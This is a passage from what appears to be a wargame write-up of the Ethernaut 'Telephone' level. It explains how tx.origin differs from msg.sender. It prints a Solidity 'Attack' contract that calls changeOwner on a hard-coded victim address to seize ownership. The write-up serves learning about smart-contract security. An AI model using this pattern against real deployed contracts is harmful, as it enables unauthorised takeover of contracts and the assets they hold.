## 5\. Telephone

The lesson here is to never confuse `tx.origin` and `msg.sender`. The former refers to the external account which initiated the transaction (no matter how many subsequent, calls there have been), while the latter refers to the immediate caller.

For example, in the call User -> A -> B -> C, for contract C, the `tx.origin` is the User (EOA) while the `msg.sender` is the contract B.

#### Solution

The solution chosen was to write a new contract and call `changeOwner` from it. This way, for the victim contract, `tx.origin` will be different from `msg.sender`, thereby fulfilling the condition.

pragma solidity >=0.7.0 <0.9.0;

// Interface of the Victim contract; the function we want to call
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {

    address Telephone;
    ITelephone telephone;

    constructor() {
        // Victim address
        Telephone = 0x6D636F14B3940591295F690A848d80D66a0F7786;
        // Grabbing victim instance through the interface
        telephone = ITelephone(Telephone);
    }

    // Function which calls the victim's function. Called by and EOA. Thereby, tx.origin is different from msg.sender
    function attack() public {
        telephone.changeOwner(0xecA5bA71FC055AF7FCdFb5755C575B67Ac48EcDF);
    }

}
